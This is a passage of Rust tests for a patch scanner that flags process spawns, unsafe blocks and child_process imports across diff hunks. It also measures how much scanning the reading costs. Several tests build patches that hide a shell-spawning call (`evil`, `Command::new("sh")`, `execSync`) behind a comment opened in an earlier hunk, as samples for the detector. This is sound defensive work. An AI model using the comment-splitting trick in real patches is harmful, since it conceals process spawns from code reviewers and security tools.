    }

    /// With a line of the file between two hunks that the patch does not show, the second
    /// starts as code, as it always has: what the unseen line holds is not known (it may close
    /// the comment). Each form below is read as 0.8.3 read it, with no item.
    ///
    /// `git apply` (2.56.0) on the twelve-line file: `@@ -1,2 +1,3 @@` then `@@ -4,1 +5,2 @@`
    /// is accepted and line 3 of the file stands between the hunks. (A hunk that only adds is
    /// a different matter: Git appends it, and the next test holds that.)
    #[test]
    fn a_hunk_with_an_unseen_line_before_it_starts_as_code() {
        let spawn = "pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }";
        let head = "--- a/src/f.rs\n+++ b/src/f.rs\n";
        for second in [
            // one unseen line
            format!("@@ -4,1 +5,2 @@\n+// */ {spawn}\n pub fn d() {{}}\n"),
            // an overlap, which Git refuses
            format!("@@ -2,2 +3,3 @@\n pub fn b() {{}}\n+// */ {spawn}\n pub fn c() {{}}\n"),
        ] {
            let patch =
                format!("{head}@@ -1,2 +1,3 @@\n pub fn a() {{}}\n+/*\n pub fn b() {{}}\n{second}");
            assert_eq!(released_items(&patch), [], "{patch}");
            // Since the merge with the integrity signals: a hunk that is not the top of its
            // file is also read from inside a block comment, and there `// */` closes it and
            // the call is code. (Was `items(&patch) == []`, the reading of 0.8.4 alone.)
            let at = if second.starts_with("@@ -4") { 5 } else { 4 };
            assert_eq!(items(&patch), [(S::ProcessSpawn, Side::New, at)], "{patch}");
        }
    }

    /// The items of a patch's one file when each hunk is read alone: what the reading of 0.8.3
    /// and the lexer reading find from a start as code.
    /// The parser refuses the patch: a hunk `git apply` places elsewhere than its header says.
    fn placed_elsewhere(patch: &str) -> bool {
        matches!(
            parse(patch),
            Err(deep_diff_forge_patch::PatchParseError::HunkPlacedElsewhere { .. })
        )
    }

    fn items_of_hunks_alone(patch: &str) -> Vec<Found> {
        let file = parse(patch).unwrap().remove(0);
        let kind = FileKind::of(&file);
        let rules: Vec<&Rule> = RELEASED_RULES
            .iter()
            .filter(|r| kind.admits(r.scope))
            .collect();
        file.patch_twin
            .hunks
            .iter()
            .flat_map(|hunk| hunk_matches(hunk, kind.language, &rules))
            .map(|(side, signal, line)| (signal, side, line))
            .collect()
    }

    /// The pieces of the lines of [`no_hunk_of_a_file_has_fewer_items_than_read_alone`].
    const RUN_ATOMS: [&str; 18] = [
        "unsafe { g() }",
        "std::process::Command::new(\"sh\")",
        "/*",
        "*/",
        "//",
        "\"",
        "'\"'",
        "r#\"",
        "\"#",
        " ",
        "x",
        "/* /* */",
        "// */",
        "\"/*\"",
        "#[test]",
        "'\\x41'",
        "// */ unsafe { g() }",
        "\"; unsafe { g() }",
    ];

    /// A carried reading is one more reading and replaces none: for hunks made from the pieces
    /// the readings disagree about, every item a hunk has when it is read alone (which is what
    /// 0.8.3 and the lexer reading find from a start as code, the whole answer before hunks
    /// were joined) is an item of the file, and the per-hunk labels, asked in order, backwards
    /// and one at a time, are the file's. The hunks are a created file cut into hunks, added
    /// lines between two lines of an existing file, and an existing file's hunks of every form
    /// with any numbers (added lines only, a line and added lines, context on both sides, a
    /// last line removed), in a file the patch creates and in one that exists. A created file cut into
    /// hunks has every item its lexer reading has as one hunk.
    #[test]
    fn no_hunk_of_a_file_has_fewer_items_than_read_alone() {
        use std::fmt::Write as _;
        let mut seed = 0x2545_F491_4F6C_DD1D_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let (mut more, mut runs, mut read) = (0, 0, 0);
        for case in 0..4500 {
            let lines: Vec<String> = (0..=1 + next(7))
                .map(|_| {
                    (0..=next(4))
                        .map(|_| RUN_ATOMS[next(RUN_ATOMS.len())])
                        .collect()
                })
                .collect();
            let created = case % 3 == 0;
            let any_form = case % 3 == 2;
            // Cut the lines into hunks: a creation; added lines between lines 5 and 6 of an
            // existing file (with context on both sides: the parser refuses a hunk with none,
            // or one with no trailing context before another); or hunks of every form at any
            // old position, of which the parser reads those Git places where they say.
            let (mut text, mut at, mut joined) = (String::new(), 0, String::new());
            while at < lines.len() {
                let take = 1 + next(lines.len() - at);
                // A creation's hunks are numbered from line 0, the only form the parser reads.
                let (old, new) = if created { (0, at + 1) } else { (5, at + 6) };
                let plain = if created { 0 } else { 2 };
                let form = if any_form { next(4) } else { plain };
                let (old, new) = if any_form {
                    (1 + next(30), 100 * at + 1)
                } else {
                    (old, new)
                };
                let before = RUN_ATOMS[next(RUN_ATOMS.len())];
                match form {
                    0 => {
                        let _ = writeln!(text, "@@ -{old},0 +{new},{take} @@");
                    }
                    1 => {
                        let _ = writeln!(text, "@@ -{old},1 +{new},{} @@\n {before}", take + 1);
                    }
                    _ => {
                        let _ =
                            writeln!(text, "@@ -{old},2 +{new},{} @@\n {before}", take + 4 - form);
                    }
                }
                for line in &lines[at..at + take] {
                    let _ = writeln!(text, "+{line}");
                    let _ = writeln!(joined, "+{line}");
                }
                match form {
                    2 => text.push_str(" after\n"),
                    3 => text.push_str("-gone\n"),
                    _ => {}
                }
                at += take;
            }
            let head = if created {
                "--- /dev/null\n+++ b/src/x.rs\n"
            } else {
                "--- a/src/x.rs\n+++ b/src/x.rs\n"
            };
            let patch = format!("{head}{text}");
            if !created && placed_elsewhere(&patch) {
                continue;
            }
            let file = parse(&patch).unwrap().remove(0);
            read += 1;
            let gaining = hunks_with_more_than_alone(&file, &text);
            // Only the hunks of a creation go on from one another.
            assert!(created || gaining == 0, "a file that exists:\n{text}");
            more += gaining;
            let kind = FileKind::of(&file);
            let rules: Vec<&Rule> = RELEASED_RULES
                .iter()
                .filter(|r| kind.admits(r.scope))
                .collect();
            let evidence = file_evidence(&file);
            let hunks = &file.patch_twin.hunks;
            runs += usize::from(hunks.len() > 1);
            if created {
                let one = format!("{head}@@ -0,0 +1,{} @@\n{joined}", lines.len());
                let one = parse(&one).unwrap().remove(0);
                let lexer = hunk_matches_in(
                    &one.patch_twin.hunks[0],
                    kind.language,
                    &rules,
                    Asked::Lexer,
                );
                for (side, signal, line) in lexer {
                    assert!(
                        evidence
                            .iter()
                            .any(|e| (e.side, e.signal, e.line) == (side, signal, line)),
                        "the file as one hunk has {signal:?} on line {line}:\n{text}"
                    );
                }
            }
        }
        eprintln!("{read} of 4500 read, {runs} runs, {more} hunks with more than alone");
        assert!(
            runs > 2000 && more > 60,
            "{runs} runs, {more} hunks with more than alone"
        );
    }

    /// Not closed, and stated: the hunks of a file that exists are read each on its own,
    /// whatever their numbers say. Each of these hides a spawn behind a comment that an
    /// earlier hunk opened, in a form plain `git apply` 2.56.0 puts together (its words are in
    /// the changelog), and each is answered as its hunks are answered alone: no spawn, as in
    /// 0.8.3. Where positions Git would not write are refused is the parser, not here.
    #[test]
    fn the_hunks_of_a_file_that_exists_are_read_each_on_its_own() {
        let spawn = "pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }";
        let head = "--- a/src/lib.rs\n+++ b/src/lib.rs\n";
        for hunks in [
            // a hunk that begins where the one before it ends, by its numbers
            format!(
                "@@ -1,2 +1,3 @@\n pub fn a() {{}}\n+/*\n pub fn b() {{}}\n@@ -3,1 +4,2 @@\n+// */ {spawn}\n \
                 pub fn c() {{}}\n"
            ),
            // a hunk of added lines only, which Git appends after the hunk that ended the file
            format!(
                "@@ -12,1 +12,2 @@\n pub fn l() {{}}\n+/*\n@@ -50,0 +52,1 @@\n+// */ {spawn}\n"
            ),
            // the same with its true number, below a last line shown as context
            format!(
                "@@ -2,2 +2,3 @@\n pub fn two() {{}}\n+/*\n pub fn three() {{}}\n@@ -3,0 +5,1 @@\n\
                 +// */ {spawn}\n"
            ),
            // a chain of the two: by its number, then appended with a false one
            format!(
                "@@ -2,2 +2,3 @@\n pub fn two() {{}}\n+/*\n pub fn three() {{}}\n@@ -3,0 +5,1 @@\n\
                 +still a comment\n@@ -9,0 +6,1 @@\n+// */ {spawn}\n"
            ),
        ] {
            let patch = format!("{head}{hunks}");
            // The parser now refuses all but the first: Git places their last hunk at the end.
            if placed_elsewhere(&patch) {
                continue;
            }
            assert_eq!(released_items(&patch), [], "{patch}");
            assert_eq!(
                released_items(&patch),
                items_of_hunks_alone(&patch),
                "{patch}"
            );
            // Since the merge with the integrity signals the file's answer is more than its
            // hunks read alone: their joins (numbers that touch, a hunk Git appends after the
            // hunk that ends the file) and the reading of a fragment from inside a block
            // comment find the spawn. (Was `items(&patch) == []` and equal to the hunks alone:
            // the reading of 0.8.4.)
            let spawns: Vec<Found> = items(&patch)
                .into_iter()
                .filter(|(signal, _, _)| *signal == S::ProcessSpawn)
                .collect();
            assert_eq!(spawns.len(), 1, "{patch}");
            for item in items_of_hunks_alone(&patch) {
                assert!(items(&patch).contains(&item), "{patch}");
            }
        }
        // Removed lines too: a test removed below a string that the hunk above opened.
        let removed = format!(
            "{head}@@ -1,1 +0,0 @@\n-const S: &str = \"\n@@ -2,2 +0,0 @@\n-\"; #[test]\n-fn t() {{}}\n"
        );
        assert!(placed_elsewhere(&removed), "{removed}");
    }

    /// The reading of release 0.8.4 of a hunk read alone (what `hunk_signals` answered on the
    /// 0.8.4 line, for the hunk given: `hunk_matches`) answers for that hunk, as every release
    /// up to 0.8.3 did (with what the second reading of Rust finds): it needs no other hunk of
    /// the file. The second hunk of a creation, whose line stands behind a comment the first
    /// opened, has no label there; that release takes its label from a reading of the creation
    /// as one text (the rank's, or a [`HunkLabels`]), which has the spawn.
    #[test]
    fn hunk_signals_reads_the_hunk_given_alone() {
        let spawn = "std::process::Command::new(\"sh\");";
        let file = parse(&format!(
            "--- /dev/null\n+++ b/src/x.rs\n@@ -0,0 +1,1 @@\n+/*\n@@ -0,0 +2,1 @@\n+// */ {spawn}\n\
             @@ -0,0 +3,1 @@\n+/* /* */ // */ {spawn}\n"
        ))
        .unwrap()
        .remove(0);
        let hunks = &file.patch_twin.hunks;
        let kind = FileKind::of(&file);
        let rules: Vec<&Rule> = RELEASED_RULES
            .iter()
            .filter(|r| kind.admits(r.scope))
            .collect();
        let alone = |hunk: &PatchHunk| distinct(&hunk_matches(hunk, kind.language, &rules));
        assert_eq!(alone(&hunks[1]), []);
        assert_eq!(alone(&hunks[2]), [S::ProcessSpawn]);
        assert_eq!(HunkLabels::new(&file).of(1), [S::ProcessSpawn]);
        // Any hunk, of this file or not: its own lines decide.
        let mut other = hunks[2].clone();
        other.id = hunks[1].id;
        assert_eq!(alone(&other), [S::ProcessSpawn]);
    }

    /// The bound on what reading costs, for any patch, counted and not timed. For each side a
    /// line is on, one view of it is made as 0.8.3 made it and for Rust one more by the lexer
    /// reading; on its new side one more when it stands in a later hunk of a creation; and
    /// of these views one is alive at a time. A view is made by scanning the line once for
    /// each reading it unites: up to eight times for the view of 0.8.3 (as in 0.8.3), five
    /// for the lexer's, and five (Rust) or eight for the carried one. 2,000 generated
    /// files of every shape (created, changed, deleted; Rust and JavaScript; added, removed
    /// and context lines; openers of comments and of strings that saturate the readings),
    /// read in file order as the rank reads and by address in reverse; and the shape that
    /// cost the most in review, as a creation: seven hunks that leave four kinds of literal
    /// open, then a thousand one-line hunks.
    #[test]
    fn no_line_is_scanned_more_than_its_bound_and_one_view_is_alive_at_a_time() {
        use std::fmt::Write as _;
        const ATOMS: [&str; 14] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\")",
            "/*",
            "*/",
            "\"",
            "r#\"",
            "\"#",
            "b\"",
            "'\\",
            "`",
            "${",
            "// */ x",
            "x",
            "/* /* */",
        ];
        let mut seed = 0x0BAD_5EED_0BAD_5EED_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let mut texts: Vec<String> = Vec::new();
        let mut case = 0;
        while texts.len() < 2000 {
            case += 1;
            let path = if case % 5 == 0 {
                "src/x.js"
            } else {
                "src/x.rs"
            };
            let shape = case % 3; // created, changed, deleted
            let mut text = match shape {
                0 => format!("--- /dev/null\n+++ b/{path}\n"),
                1 => format!("--- a/{path}\n+++ b/{path}\n"),
                _ => format!("--- a/{path}\n+++ /dev/null\n"),
            };
            let (mut old, mut new) = (1, 1);
            for _ in 0..=next(5) {
                let kinds: Vec<char> = (0..=next(4))
                    .map(|_| match shape {
                        0 => '+',
                        1 => [' ', '+', '-', '+'][next(4)],
                        _ => '-',
                    })
                    .collect();
                let olds = kinds.iter().filter(|k| **k != '+').count();
                let news = kinds.iter().filter(|k| **k != '-').count();
                let from = if shape == 0 { 0 } else { old };
                let _ = writeln!(text, "@@ -{from},{olds} +{new},{news} @@");
                for kind in kinds {
                    let line: Vec<&str> = (0..=next(3)).map(|_| ATOMS[next(ATOMS.len())]).collect();
                    let _ = writeln!(text, "{kind}{}", line.join(" "));
                }
                // The next hunk begins where this one ends, or further on.
                old += olds + next(2) * 7;
                new += news;
            }
            // A text the parser refuses is not counted: 2,000 are read.
            if parse(&text).is_ok() {
                texts.push(text);
            }
        }
        assert_eq!(texts.len(), 2000);
        // The shape of the review, as a creation.
        let mut four = "--- /dev/null\n+++ b/src/four.rs\n".to_owned();
        let openers = [
            "r#\"",
            "\"#; r##\"",
            "\"##; \"",
            "\"; b\"",
            "\"; '\\",
            "x /*",
            "*/ r\"",
        ];
        for (at, line) in openers.iter().enumerate() {
            let _ = writeln!(four, "@@ -0,0 +{},1 @@\n+{line}", at + 1);
        }
        for at in 0..1000 {
            let _ = writeln!(
                four,
                "@@ -0,0 +{},1 @@\n+let v{at} = \" r#\" '\\ /* x",
                at + 8
            );
        }
        texts.push(four);
        for text in &texts {
            let file = parse(text).unwrap().remove(0);
            let hunks = &file.patch_twin.hunks;
            let rust = file.path.rsplit('.').next() == Some("rs");
            let created = file.status == FileStatus::Added;
            // The most scans of a line on one side: eight by the reading of 0.8.3 (twice
            // for each of four readings, as in 0.8.3) and for Rust five more by the lexer
            // reading; and for a line of a creation, the most by the carried reading.
            let side = 8 + if rust { 5 } else { 0 };
            let carried = if rust { 5 } else { 8 };
            let bound: usize = hunks
                .iter()
                .flat_map(|hunk| &hunk.lines)
                .map(|line| match line.kind {
                    PatchLineKind::Context => 2 * side,
                    PatchLineKind::Added => side + if created { carried } else { 0 },
                    PatchLineKind::Removed => side,
                })
                .sum();
            let in_order: Vec<usize> = (0..hunks.len()).collect();
            let reversed: Vec<usize> = in_order.iter().rev().copied().collect();
            for order in [&in_order, &reversed] {
                let mut labels = HunkLabels::naming(&file, order);
                for &index in order {
                    let _ = labels.of(index);
                }
                assert!(
                    labels.scans() <= bound,
                    "{} scans, bound {bound}:\n{text}",
                    labels.scans()
                );
                assert!(labels.views_alive_at_most() <= 1, "{text}");
            }
            // The rank reads the same way.
            let _ = file_evidence(&file);
        }
    }

    /// The rules of a signal are asked in their order until one finds something, as in every
    /// release: on a JavaScript line where the first spawn rule finds `child_process`, the
    /// spawn rules after it are not asked (a rule that was asked all the same built a list of
    /// every `from` on a 30 MB line: 251 MB where 0.8.3 took 118 MB). Counted: a line with
    /// nothing asks every rule of its side once.
    #[test]
    fn the_rules_of_a_signal_are_asked_until_one_finds_something() {
        let asked = |line: &str| {
            let file = added("src/x.js", &[line]);
            let mut labels = HunkLabels::new(&file);
            (labels.of(0), labels.rule_evaluations())
        };
        let kind = FileKind::of(&added("src/x.js", &["x"]));
        let on_side = || {
            RELEASED_RULES
                .iter()
                .filter(|r| kind.admits(r.scope) && r.side == Side::New)
        };
        let (nothing, every) = asked("let x = 1;");
        assert_eq!((nothing, every), (vec![], on_side().count()));
        let spawn: Vec<&Rule> = on_side().filter(|r| r.signal == S::ProcessSpawn).collect();
        let first = spawn
            .iter()
            .position(|r| matches!(r.matches, Match::Tokens(t) if t.contains(&"child_process")))
            .unwrap();
        let not_asked = spawn.len() - 1 - first;
        assert!(
            not_asked > 0,
            "a spawn rule stands after the one that finds it"
        );
        let (found, fewer) = asked("const cp = child_process; from from from");
        assert_eq!(found, [S::ProcessSpawn]);
        assert_eq!(fewer, every - not_asked);
    }

    /// A signal that is found is not asked for again in a later view, counted. A Rust line on
    /// which the reading of 0.8.3 finds `unsafe` and which the lexer reading reads differently
    /// (it has code behind a nested comment): the rules asked are those of the first view,
    /// each signal's until one finds something, and in the lexer view the rules that read
    /// code of every signal but the one found. In a later hunk of a creation that comes into
    /// an open comment there is a third view, and the same holds of it.
    #[test]
    fn a_signal_that_is_found_is_not_asked_for_again_in_a_later_view() {
        let line = "unsafe { g() } /* /* */ // */ let y = 1;";
        let one = added("src/x.rs", &[line]);
        let kind = &FileKind::of(&one);
        let on_side = |signal: EvidenceSignal| {
            RELEASED_RULES
                .iter()
                .filter(move |r| kind.admits(r.scope) && r.side == Side::New && r.signal == signal)
        };
        let finds = |r: &&Rule| matches!(r.matches, Match::Tokens(t) if t.contains(&"unsafe"));
        let found_at = on_side(S::UnsafeAdded).position(|r| finds(&r)).unwrap();
        // The first view: the found signal's rules up to the one that finds, every rule of
        // the others.
        let first: usize = EvidenceSignal::ALL
            .into_iter()
            .map(|signal| match signal {
                S::UnsafeAdded => found_at + 1,
                _ => on_side(signal).count(),
            })
            .sum();
        // A later view: the rules that read code, of every signal but the one found.
        let later: usize = EvidenceSignal::ALL
            .into_iter()
            .filter(|signal| *signal != S::UnsafeAdded)
            .map(|signal| on_side(signal).filter(|r| r.view == View::Code).count())
            .sum();
        assert!(later > 0 && on_side(S::UnsafeAdded).any(|r| r.view == View::Code));
        let mut labels = HunkLabels::new(&one);
        assert_eq!(labels.of(0), [S::UnsafeAdded]);
        assert_eq!(labels.rule_evaluations(), first + later, "two views");
        let file = parse(&format!(
            "--- /dev/null\n+++ b/src/x.rs\n@@ -0,0 +1,1 @@\n+/*\n@@ -0,0 +2,1 @@\n+*/ {line}\n"
        ))
        .unwrap()
        .remove(0);
        let mut labels = HunkLabels::new(&file);
        let _ = labels.of(0);
        let before = labels.rule_evaluations();
        assert_eq!(labels.of(1), [S::UnsafeAdded]);
        assert_eq!(
            labels.rule_evaluations() - before,
            first + 2 * later,
            "three views"
        );
    }

    /// The import rule as it was before it took its keyword hits one at a time: it kept a
    /// list of every hit on the line and sorted it.
    fn imports_module_with_a_list(code: &str, raw: &str, modules: &[&str]) -> bool {
        let c = code.as_bytes();
        let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
            let before = &code[..at];
            let receiver_ok = at == 0
                || !is_boundary_blocker(c[at - 1])
                || (keyword == "require" && before.ends_with("module."));
            let after = at + keyword.len();
            if !receiver_ok
                || c.get(after).is_some_and(|b| is_ident(*b))
                || (keyword == "import" && before.trim_end().ends_with("typeof"))
            {
                return None;
            }
            let gap = c[after..]
                .iter()
                .take_while(|b| b.is_ascii_whitespace() || **b == b'(')
                .count();
            let q = after + gap;
            if keyword == "require" && !c[after..q].contains(&b'(') {
                return None;
            }
            let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
            let name = raw.get(q + 1..)?;
            let name = &name[..name.find(char::from(quote))?];
            Some(name.strip_prefix("node:").unwrap_or(name))
        };
        let mut hits: Vec<(usize, &str)> = ["require", "import", "from"]
            .iter()
            .flat_map(|keyword| code.match_indices(keyword).map(|(at, _)| (at, *keyword)))
            .collect();
        hits.sort_unstable();
        let (mut seen, mut start, mut type_only) = (0, 0, None);
        hits.into_iter().any(|(at, keyword)| {
            if let Some(semi) = code[seen..at].rfind(';') {
                start = seen + semi + 1;
                type_only = None;
            }
            seen = at;
            let skip = *type_only.get_or_insert_with(|| {
                let head = code[start..].trim_start();
                head.starts_with("import type ") || head.starts_with("export type ")
            });
            !skip && specifier_at(at, keyword).is_some_and(|m| modules.contains(&m))
        })
    }

    /// The import rule answers as it did when it kept a list of its hits: 40,000 generated
    /// lines of keywords, quotes, parentheses, statement ends and type-only heads.
    #[test]
    fn the_import_rule_without_a_list_answers_as_with_one() {
        const ATOMS: [&str; 18] = [
            "require",
            "import",
            "from",
            "(",
            " ",
            "'child_process'",
            "\"fs\"",
            "`node:child_process`",
            ";",
            "import type ",
            "export type ",
            "module.",
            "typeof ",
            "x",
            ")",
            "'other'",
            "fromage",
            "\"",
        ];
        let mut seed = 0x1357_9BDF_2468_ACE1_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let mut found = 0;
        for _ in 0..40_000 {
            let line: String = (0..=next(9)).map(|_| ATOMS[next(ATOMS.len())]).collect();
            for modules in [&["child_process"][..], &["fs", "other"][..]] {
                let now = imports_module(&line, &line, modules);
                assert_eq!(
                    now,
                    imports_module_with_a_list(&line, &line, modules),
                    "{line:?}"
                );
                found += usize::from(now);
            }
        }
        assert!(found > 2000, "{found} lines with an import");
    }

    /// What the hunks of a creation cost and what a reader keeps, counted. A file the patch
    /// creates in 3,000 one-line Rust hunks, the first of which opens a comment that only the
    /// last closes: every later hunk comes into something open, so every line but the first
    /// is scanned three times, in file order, in reverse and shuffled alike, and one entry is
    /// kept in file order whatever the number of hunks. Asked for ten hunks in reverse, the
    /// ten labels are kept, eight bytes each, and the hunks between are scanned once, for the
    /// state alone. A hunk behind the reading that was not named is still answered right.
    #[test]
    fn the_hunks_of_a_creation_cost_the_same_in_any_order_and_keep_what_is_asked() {
        use std::fmt::Write as _;
        const HUNKS: usize = 3000;
        let mut text = "--- /dev/null\n+++ b/src/x.rs\n@@ -0,0 +1,1 @@\n+/*\n".to_owned();
        for hunk in 1..HUNKS - 1 {
            let _ = write!(text, "@@ -0,0 +{},1 @@\n+x{hunk}\n", hunk + 1);
        }
        let _ = write!(
            text,
            "@@ -0,0 +{HUNKS},1 @@\n+// */ std::process::Command::new(\"sh\");\n"
        );
        let file = parse(&text).unwrap().remove(0);
        assert_eq!(file.patch_twin.hunks.len(), HUNKS);
        // Asks the hunks in `order` of a reader told the order: the scans, the labels by
        // hunk, the most entries kept at any time and the entries kept at the end.
        let ask = |order: &[usize]| {
            let mut labels = HunkLabels::naming(&file, order);
            let mut got = vec![Vec::new(); HUNKS];
            let mut most = 0;
            for &index in order {
                got[index] = labels.of(index);
                most = most.max(labels.entries_kept());
            }
            assert_eq!(labels.views_alive_at_most(), 1);
            (labels.scans(), got, most, labels.entries_kept())
        };
        let in_order: Vec<usize> = (0..HUNKS).collect();
        let (scans, labels, most, kept) = ask(&in_order);
        assert_eq!(scans, 2 + 3 * (HUNKS - 1), "in file order");
        assert_eq!((most, kept), (1, 1), "in file order, one entry");
        assert_eq!(labels[HUNKS - 1], [EvidenceSignal::ProcessSpawn]);
        assert!(labels[..HUNKS - 1].iter().all(Vec::is_empty));
        assert_eq!(file_evidence(&file).len(), 1);
        let reversed: Vec<usize> = (0..HUNKS).rev().collect();
        let mut shuffled = in_order.clone();
        let mut seed = 0x2545_F491_4F6C_DD1D_u64;
        for at in (1..HUNKS).rev() {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            shuffled.swap(at, usize::try_from(seed % (at as u64 + 1)).unwrap());
        }
        for order in [&reversed, &shuffled] {
            let (scans_so, labels_so, most, kept) = ask(order);
            assert_eq!(scans_so, scans);
            assert!(labels_so == labels && most <= HUNKS && kept == HUNKS);
        }
        // Ten hunks named, in reverse: ten labels kept; the others scanned once each.
        let ten: Vec<usize> = (0..10).map(|k| HUNKS - 1 - 300 * k).collect();
        let (scans_ten, of_ten, most, kept) = ask(&ten);
        assert!(most <= 11 && kept == 10, "{most} {kept}");
        assert_eq!(of_ten[HUNKS - 1], labels[HUNKS - 1]);
        assert_eq!(scans_ten, 10 * 3 + (HUNKS - 10), "ten named of {HUNKS}");
        assert_eq!(std::mem::size_of::<(u32, u16)>(), 8);
        // Not named and behind the reading: the file is gone through again, and the answer
        // is the same.
        let mut unnamed = HunkLabels::new(&file);
        assert_eq!(unnamed.of(HUNKS - 1), labels[HUNKS - 1]);
        assert_eq!(unnamed.of(7), labels[7]);
        assert_eq!(unnamed.of(HUNKS - 1), labels[HUNKS - 1]);
        assert_eq!(unnamed.entries_kept(), 1);
        // The hunks of a file that exists: nothing is kept, in any order.
        let apart = text.replacen("--- /dev/null", "--- a/src/x.rs", 1);
        let file = parse(&apart).unwrap().remove(0);
        let mut alone = HunkLabels::naming(&file, &reversed);
        for &index in &reversed {
            assert_eq!(alone.of(index), []);
            assert_eq!(alone.entries_kept(), 0);
        }
        assert_eq!(alone.scans(), 2 * HUNKS);
    }

    /// A creation in hunks whose every hunk leaves a block comment open, and whose next hunk
    /// closes it behind a line comment before a spawn: the spawn is found only by the reading
    /// carried from hunk to hunk. `kind` 0 and 1 are Rust, 2 and 3 JavaScript; 0 and 2 reach
    /// the bound by their bytes (48 hunks of about 8 KiB), 1 and 3 by a line of 513 bytes in
    /// the middle of hunk 20 (48 hunks of a few hundred bytes). Returns the text and where the
    /// bound is by its definition: the first hunk with a new-side line over 512 bytes or that
    /// takes the new side (each line counted with its end) past 256 KiB.
    fn over_the_bound(kind: usize) -> (String, usize) {
        use std::fmt::Write as _;
        let (path, spawn) = if kind < 2 {
            ("src/x.rs", "std::process::Command::new(\"sh\");")
        } else {
            ("src/x.js", "execSync(\"sh\");")
        };
        let by_bytes = kind.is_multiple_of(2);
        let mut text = format!("--- /dev/null\n+++ b/{path}\n");
        let (mut at, mut bytes) = (1, 0);
        let mut bound = None;
        for hunk in 0..48 {
            let mut lines = vec![format!("// */ {spawn}")];
            let filler = if by_bytes { 100 } else { 3 };
            lines.extend((0..filler).map(|n| format!("let v{hunk}_{n} = {n:<60};")));
            if !by_bytes && hunk == 20 {
                lines.insert(2, format!("let long = {:<501};", 0));
                assert_eq!(lines[2].len(), 513);
            }
            lines.push("let x = 1; /*".to_owned());
            let _ = writeln!(text, "@@ -0,0 +{at},{} @@", lines.len());
            for line in &lines {
                let _ = writeln!(text, "+{line}");
                bytes += line.len() + 1;
                if bound.is_none() && (line.len() > 512 || bytes > 256 * 1024) {
                    bound = Some(hunk);
                }
            }
            at += lines.len();
        }
        let bound = bound.unwrap();
        assert!(bound > 1 && bound < 47, "{bound}");
        (text, bound)
    }

    /// The reading carried from hunk to hunk of a creation stops at its bound, at the same hunk
    /// whatever the hunks are asked in: the rank, in file order, each hunk alone, named in
    /// reverse and shuffled with repeats, and backwards unnamed (going through the file again
    /// for each). Before the bound a hunk that comes into the comment the hunk before it opened
    /// has the spawn; from the bound on every hunk has what it has read alone. And counted: no
    /// request reads more than 256 KiB of lines in the carried reading, and asking for a hunk
    /// past the bound, the last one alone for one, reads none.
    #[test]
    fn the_carried_reading_stops_at_its_bound_whatever_is_asked() {
        for kind in 0..4 {
            let (text, bound) = over_the_bound(kind);
            let file = parse(&text).unwrap().remove(0);
            let hunks = &file.patch_twin.hunks;
            let last = hunks.len() - 1;
            let bytes_of = |hunk: &PatchHunk| -> usize {
                hunk.lines.iter().map(|line| line.text.len() + 1).sum()
            };
            let before: usize = hunks[..bound].iter().map(bytes_of).sum();
            assert_eq!(HunkLabels::new(&file).read_together(), bound, "kind {kind}");
            // The last hunk alone, and the hunk at the bound: nothing carried.
            for index in [last, bound] {
                let mut alone = HunkLabels::new(&file);
                assert_eq!(alone.of(index), [], "kind {kind}, hunk {index}");
                assert_eq!(alone.carried_bytes(), 0, "kind {kind}, hunk {index}");
            }
            // The last hunk before the bound: the hunks before it, and it, once.
            let mut below = HunkLabels::new(&file);
            assert_eq!(below.of(bound - 1), [EvidenceSignal::ProcessSpawn]);
            assert_eq!(below.carried_bytes(), before, "kind {kind}");
            assert!(before <= CARRIED_BYTES, "kind {kind}");
            // Behind the reading: the file again from its top, as far as the hunk asked.
            let carried = below.carried_bytes();
            assert_eq!(below.of(1), [EvidenceSignal::ProcessSpawn]);
            assert_eq!(
                below.carried_bytes() - carried,
                bytes_of(&hunks[0]) + bytes_of(&hunks[1])
            );
            // Every order asks for no more than the bound in one request.
            let in_order: Vec<usize> = (0..hunks.len()).collect();
            let reversed: Vec<usize> = in_order.iter().rev().copied().collect();
            let mut seed = 0x5DEE_CE66_D1CE_4E5B_u64 ^ kind as u64;
            let shuffled: Vec<usize> = (0..2 * hunks.len())
                .map(|_| {
                    seed ^= seed << 13;
                    seed ^= seed >> 7;
                    seed ^= seed << 17;
                    usize::try_from(seed % (hunks.len() as u64)).unwrap()
                })
                .collect();
            for order in [&in_order, &reversed, &shuffled] {
                for named in [true, false] {
                    let mut labels = if named {
                        HunkLabels::naming(&file, order)
                    } else {
                        HunkLabels::new(&file)
                    };
                    for &index in order {
                        let carried = labels.carried_bytes();
                        let got = labels.of(index);
                        let read = labels.carried_bytes() - carried;
                        assert!(read <= CARRIED_BYTES, "kind {kind}, hunk {index}: {read}");
                        if index >= bound {
                            assert_eq!(read, 0, "kind {kind}, hunk {index}");
                        }
                        let spawn = (1..bound).contains(&index);
                        assert_eq!(got.is_empty(), !spawn, "kind {kind}, hunk {index}");
                    }
                    if named {
                        // One pass, as far as the last hunk before the bound.
                        assert!(labels.carried_bytes() <= before, "kind {kind}");
                    }
                }
            }
            // The rank, file order, each hunk alone, named and unnamed in any order: the same
            // labels, and more than alone exactly in the hunks between the first and the bound.
            assert_eq!(
                hunks_with_more_than_alone(&file, &text),
                bound - 1,
                "kind {kind}"
            );
        }
    }

    /// The new-side text of a creation of `path` (Rust, or JavaScript when `path` ends in
    /// `.js`) whose hunk `h` is exactly `sizes[h]` bytes, each line counted with its end: a
    /// line that closes the comment the hunk before left open and then spawns a process,
    /// filler lines of at most 401 bytes (of `§`, two bytes each, when `wide`), and a line
    /// that opens a comment. Only the reading carried from hunk to hunk finds the spawn, in
    /// every hunk read together but the first. At a path in any other language the text is
    /// the Rust one, for the shares alone: they count its bytes, which are the same.
    fn sized_creation(path: &str, sizes: &[usize], wide: bool) -> String {
